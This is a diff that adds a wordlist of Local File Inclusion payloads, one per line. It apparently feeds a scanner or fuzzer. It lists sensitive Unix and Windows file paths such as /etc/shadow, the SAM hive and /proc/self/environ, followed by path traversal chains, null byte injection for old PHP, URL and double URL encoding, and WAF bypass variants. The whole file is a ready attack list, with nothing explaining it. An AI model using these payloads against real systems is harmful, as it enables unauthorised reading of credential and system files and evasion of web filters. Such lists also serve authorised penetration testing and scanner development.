@@ -1,0 +1,85 @@
+# LFI (Local File Inclusion) Payloads
+# One payload per line
+
+# ========================
+# Unix/Linux Files
+# ========================
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/resolv.conf
+/etc/network/interfaces
+/proc/self/environ
+/proc/version
+/proc/cmdline
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/auth.log
+/var/log/syslog
+
+# ========================
+# Windows Files
+# ========================
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\config\SAM
+C:\boot.ini
+C:\Windows\debug\NetSetup.log
+C:\Windows\WindowsUpdate.log
+C:\WINNT\win.ini
+C:\WINNT\system32\cmd.exe
+
+# ========================
+# Path Traversal - Unix
+# ========================
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+
+# ========================
+# Path Traversal - Windows
+# ========================
+..\Windows\win.ini
+..\..\Windows\win.ini
+..\..\..\Windows\win.ini
+..\..\..\..\Windows\win.ini
+
+# ========================
+# Null Byte Injection (PHP < 5.3.4)
+# ========================
+../../../etc/passwd%00
+../../../etc/passwd\0
+../../../etc/passwd%2500
+
+# ========================
+# URL Encoded
+# ========================
+..%2Fetc%2Fpasswd
+..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/etc/passwd
+
+# ========================
+# Double URL Encoded
+# ========================
+..%252Fetc%252Fpasswd
+..%252F..%252Fetc%252Fpasswd
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# ========================
+# WAF Bypass
+# ========================
+....//....//etc/passwd
+....\/....\/etc/passwd
+..///////..////..//////etc/passwd
+/%5C../etc/passwd
+/./././././././././././etc/passwd
